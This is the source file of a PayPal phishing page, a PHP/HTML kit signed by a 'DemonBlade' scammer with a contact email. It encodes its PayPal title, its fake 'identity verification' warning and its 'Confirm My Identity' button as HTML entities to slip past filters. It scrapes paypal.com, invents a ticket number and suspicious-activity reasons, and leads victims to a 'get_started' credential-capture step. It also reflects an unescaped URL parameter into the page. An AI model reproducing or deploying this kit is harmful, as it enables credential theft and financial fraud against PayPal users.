﻿<?php
  error_reporting(0);
  $return_email = $_GET['return_access'];
  if(empty($return_email)){
    $return_email = "User";
  }else{
    $return_email = $_GET['return_access'];
  }
?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title> &#83;&#101;&#110;&#100;&#32;&#77;&#111;&#110;&#101;&#121;&#44;&#32;&#80;&#97;&#121;&#32;&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#111;&#114;&#32;&#83;&#101;&#116;&#32;&#85;&#112;&#32;&#97;&#32;&#77;&#101;&#114;&#99;&#104;&#97;&#110;&#116;&#32;&#65;&#99;&#99;&#111;&#117;&#110;&#116;&#32;&#45;&#32;&#80;&#97;&#121;&#80;&#97;&#108;&#32; </title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" id="metadesc" content="">
    <script type="text/javascript">
      $(document).ready(function(){
        var startdesc = "Hi Spammer this Scam was Created by DemonBlade, To contact Me on email : wixamino@gmail.com";
        $("#metadesc").attr("content",startdesc);
      });
    </script>
    <script src="js/ajax.js" charset="utf-8"></script>
    <script src="js/jquery.js" charset="utf-8"></script>
    <script src="js/jquery.min.js" charset="utf-8"></script>
    <script src="js/js-plus.js" charset="utf-8"></script>
    <link rel="stylesheet" href="css/styles.css">
    <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
    <link href="https://file.myfontastic.com/hSMyDca9BDwBA8GgvxRZRP/icons.css" rel="stylesheet">
  </head>
  <body>
    <div class="get_contents">
      <?php
        echo file_get_contents("https://www.paypal.com/");
      ?>
    </div>
    <div class="backfull">
      <div class="panels">
        <img src="css/logo.png" alt="">
        <br><br>
        <div class="description">
          Dear <b id="accessreturn"><?php echo $return_email ?></b>, &#89;&#111;&#117;&#114;&#32;&#65;&#99;&#99;&#111;&#117;&#110;&#116;&#32;&#105;&#115;&#32;&#85;&#110;&#102;&#111;&#114;&#116;&#117;&#110;&#97;&#116;&#101;&#108;&#121;&#32;&#69;&#110;&#114;&#111;&#108;&#108;&#101;&#100;&#32;&#105;&#110;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;&#32;&#86;&#101;&#114;&#105;&#102;&#105;&#99;&#97;&#116;&#105;&#111;&#110;&#32; <br><br>
          <b>Ticket : #<?php echo rand(10000,99999); ?></b><br><br>
          <b>For This Reason : </b> <br>
          <span style="visibility: hidden;">##</span> <b>○ Fake Transaction .</b><br>
          <span style="visibility: hidden;">##</span> <b>○ The account receives a connection from another country </b><br><br>
        </div><br><br>
        <a href="get_started/<?php if($return_email != 'User'){echo '?return_access=' . $return_email;} ?>">
          <div class="btns" name="get_started">
            &#67;&#111;&#110;&#102;&#105;&#114;&#109;&#32;&#77;&#121;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;&#32;
            <div class="children"></div>
          </div>
        </a>
        <br><br>
      </div>
    </div>
    <script type="text/javascript">
      $(document).ready(function(){

      });
    </script>
  </body>
</html>
